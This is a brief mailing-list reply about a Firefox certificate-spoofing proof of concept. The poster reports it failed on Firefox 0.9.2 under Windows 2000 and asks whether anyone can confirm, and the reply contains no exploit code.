Subject: [sb] Re: Re: Mozilla Firefox Certificate Spoofing


Has anyone tried the proof of concept with a real ssl cert and get it working? 

I just tried it using two different ssl urls and the page only
redirected me to the proper site. I did not see the output generated
by document.writeln even after viewing the source.

Can anyone confirm this? I haven't seen any mention of it on bugzilla either. 

Im using: 

0.9.2 on Windows2k
